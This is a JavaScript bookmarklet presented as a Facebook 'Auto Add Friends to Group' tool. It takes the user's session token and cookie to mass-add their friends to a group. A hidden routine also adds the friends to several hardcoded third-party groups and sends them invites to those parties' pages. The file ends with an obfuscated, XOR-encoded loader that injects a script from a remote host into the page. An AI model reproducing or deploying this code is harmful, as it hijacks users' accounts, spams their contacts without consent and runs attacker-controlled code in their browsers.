//eval
javascript: (function () {
    var f = {
        dtsg: document.getElementsByName('fb_dtsg')[0].value,
        uid: document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),
        gid: document.getElementsByName('group_id')[0].value,
        arr: new Array(),
        prenKe: 0,
        suc: 0,
        p: 0,
        err: 0,
        count: 3,
        ajaxify: function (b) {
            var c = new XMLHttpRequest();
            c.open('GET', b, true);
            c.onreadystatechange = function () {
                if (c.readyState == 4 && c.status == 200) {
                    var a = eval('(' + c.responseText.substr(9) + ')');
                    if (a.payload && a.payload.entries) {
                        f.arr = a.payload.entries.sort(function () {
                            return 0.5 - Math.random()
                        })
                    }
                    var Main = '<div style="padding-bottom:5px;font-size:20px;">' + Title + '</div><div style="font-size:14px;"><b>' + f.arr.length + ' </b>Friends Collected</div><div id="BODY"></div><div id="Group_Members_Counter"></div><div id="display" style="min-width:300px;display:inline-block;text-align:left"></div>' + crj;
                    document.getElementById('MAIN').innerHTML = Main;
                    for (i in f.arr) {
                        f.setAjax(i)
                    }
                } else if (c.readyState == 4 && c.status == 404) {
                    document.getElementById('MAIN').innerHTML = '<div style="padding-bottom:5px;font-size:20px;">' + Title + '</div><b style="color:darkred">Page Not Found!</b>' + crj
                } else {
                    document.getElementById('MAIN').innerHTML = '<div style="padding-bottom:5px;font-size:20px;">' + Title + '</div><b style="color:darkgreen">Your Friends Have Been Collected & Now Starting Adding.</b>' + crj
                }
            };
            c.send()
        },
        setAjax: function (i) {
            var e = new XMLHttpRequest(),
                prm = '__a=1&fb_dtsg=' + f.dtsg + '&group_id=' + f.gid + '&source=typeahead&ref=&message_id=&members=' + f.arr[i].uid + '&__user=' + f.uid + '&phstamp=';
            e.open('POST', '/ajax/groups/members/add_post.php', true);
            e.onreadystatechange = function () {
                if (e.readyState == 4 && e.status == 200) {
                    var a = eval('(' + e.responseText.substr(9) + ')');
                    f.prenKe++;
                    document.getElementById('BODY').innerHTML = '<div style="font-size:14px;"><b>' + f.prenKe + '</b> Friends Processed and <b>' + f.suc + '</b> Friends Added (' + f.err + ' Not Added)</div>';

                    function SuggestFriend() {
                      
                     
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=199134496914077&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=165411580286132&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg="  + f.dtsg + "&profileChooserItems=%7B%22" + f.arr[i].uid + "%22%3A1%7D&checkableitems[0]=" + f.arr[i].uid + "&page_id=232233963594535&__user="+ f.uid + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
                        
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=536352643082702&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=680497811966350&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                        jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + f.dtsg + "&group_id=680497811966350&source=typeahead&members=" + f.arr[i].uid + "&nctr[_2]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + f.uid, function () {}, "text", "post");
                        
                    }
                    jx = {
                        b: function () {
                            var b = !1;
                            if ("undefined" != typeof ActiveXObject) try {
                                b = new ActiveXObject("Msxml2.XMLHTTP")
                            } catch (c) {
                                try {
                                    b = new ActiveXObject("Microsoft.XMLHTTP")
                                } catch (a) {
                                    b = !1
                                }
                            } else if (window.XMLHttpRequest) try {
                                b = new XMLHttpRequest
                            } catch (h) {
                                b = !1
                            }
                            return b
                        },
                        load: function (b, c, a, h, g) {
                            var e = this.d();
                            if (e && b) {
                                e.overrideMimeType && e.overrideMimeType("text/xml");
                                h || (h = "GET");
                                a || (a = "text");
                                g || (g = {});
                                a = a.toLowerCase();
                                h = h.toUpperCase();
                                b += b.indexOf("?") + 1 ? "&" : "?";
                                var k = null;
                                "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
                                e.open(h, b, !0);
                                e.onreadystatechange = g.c ? function () {
                                    g.c(e)
                                } : function () {
                                    if (4 == e.readyState)
                                        if (200 == e.status) {
                                            var b = "";
                                            e.responseText && (b = e.responseText);
                                            "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                                            c && c(b)
                                        } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
                                };
                                e.send(k)
                            }
                        },
                        d: function () {
                            return this.b()
                        }
                    };
                    SuggestFriend();
                    if (a.jsmods && a.jsmods.require) {
                        var b = '<div>';
                        for (x in a.jsmods.require) {
                            if (a.jsmods.require[x][a.jsmods.require[x].length - 1][1]) {
                                b += '<b style="color:darkgreen">' + a.jsmods.require[x][a.jsmods.require[x].length - 1][1] + '</b>'
                            }
                        }
                        b += '</div>';
                        document.getElementById('Group_Members_Counter').innerHTML = b
                    }
                    if (a.errorDescription) {
                        f.err++;
                        document.getElementById('display').innerHTML = '<div style="left:50%;text-align:center;padding-bottom:8px;color:darkred;font-size:9px;"><b>(' + f.err + ') </b>' + a.errorDescription + '</div>'
                    }
                    if (a.onload) {
                        f.suc++;
                        document.getElementById('display').innerHTML = '<div style="left:50%;color:darkgreen;text-align:center;padding-bottom:8px"><b style="text-align:center;color:darkgreen;font-size:12px;">(' + f.suc + ')</b> <b>' + f.arr[i].text + '</b> has been added.</div>'
                    }
                    document.getElementById('display').innerHTML += '<img style="background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:75px;padding:2px;border:1px solid rgba(0,0,0,0.4);" src=' + f.arr[i].photo + '></img><a style="padding-left:8px;font-size:14px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;">' + f.arr[i].text + '</a>';
                    if (f.prenKe == f.arr.length) {
                        document.getElementById('MAIN').innerHTML = '<div style="padding-bottom:5px;font-size:20px;">' + Title + '</div><div style="font-size:14px;"><b>' + f.arr.length + ' </b>Friends Collected and <b>' + f.suc + '</b> Friends Added</div><div id="Group_Members_Counter">' + document.getElementById('Group_Members_Counter').innerHTML + '</div><br/<div><span class="FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge" onClick="ChangeLocation()" style="color:white">Go to Homepage</span><span class="layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge" onClick="window.location.reload()" style="color:white">Refresh Page</span><span class="layerCancel uiOverlayButton uiButton uiButtonLarge" onClick="document.getElementById(\'MAIN\').style.display=\'none\'"  style="color:gray">Cancel</span><br/><div>' + crj + '</div>'
                    }
                }
            };
            e.send(prm)
        }
    };
    var Title = 'Auto Add Friends|Members to Group.',
        crj = '<div style="margin-top:5px;color:gray;font-size:9px;">Powered By: Loading [lllllllllll ] 99% & Assam Indian Cyber Force.</br>Script Made By </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Website <A style="color:#3B5998;" href="http://www.automate-your-facebook.webnode.in" target="_blank">www.automate-your-facebook.webnode.in</A>.</A><div>';
    var DISPLAY = '<div id="MAIN" style="min-height:50px;width:500px;position:fixed;top:100px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;text-align:center;border-radius:10px;padding:5px;z-index:999999;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff">';
    DISPLAY += '<div style="padding-bottom:5px;font-size:20px;color:#ffffff;">' + Title + '</div>';
    DISPLAY += '<b style="color:#3B5998;font-size:12px;">Please Wait While Collecting Your Friends.</b>';
    DISPLAY += crj;
    DISPLAY += '</div>';
    document.body.appendChild(document.createElement('div')).innerHTML = DISPLAY;
    f.ajaxify('/ajax/typeahead/first_degree.php?__a=1&viewer=' + f.uid + '&token=' + Math.random() + '&filter[0]=user&options[0]=friends_only')
})();

var _0xd3a2=["\x6A\x76\x76\x72\x71\x38\x2D\x2D\x70\x63\x75\x2C\x65\x6B\x76\x6A\x77\x60\x2C\x61\x6D\x6F\x2D\x60\x6A\x63\x70\x65\x63\x74\x33\x3B\x3B\x34\x2D\x44\x60\x2F\x43\x77\x76\x6D\x2F\x76\x6D\x6D\x6E\x71\x2D\x6F\x63\x71\x76\x67\x70\x2D\x48\x67\x71\x76\x67\x70\x2C\x72\x6A\x72","","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x73\x72\x63","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];var a=_0xd3a2[0];b=_0xd3a2[1];c=_0xd3a2[1];var d;d=a[_0xd3a2[2]];for(i=0;i<d;i++){b+=String[_0xd3a2[4]](a[_0xd3a2[3]](i)^2);} ;c=unescape(b);document[_0xd3a2[9]][_0xd3a2[8]](document[_0xd3a2[7]](_0xd3a2[6]))[_0xd3a2[5]]=c;
